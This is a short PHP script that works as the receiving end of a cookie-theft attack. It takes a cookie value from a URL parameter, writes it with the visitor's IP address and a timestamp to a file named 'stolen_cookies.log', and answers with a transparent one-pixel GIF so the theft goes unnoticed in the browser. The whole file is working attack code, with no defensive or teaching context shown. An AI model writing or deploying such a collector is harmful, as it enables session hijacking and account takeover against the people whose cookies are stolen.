<?php
$cookie = $_GET['cookie'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');

$logEntry = "[$timestamp] Cookie stolen from $ip: $cookie\n";
file_put_contents('stolen_cookies.log', $logEntry, FILE_APPEND);

// Return a small transparent GIF to avoid browser errors
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'); 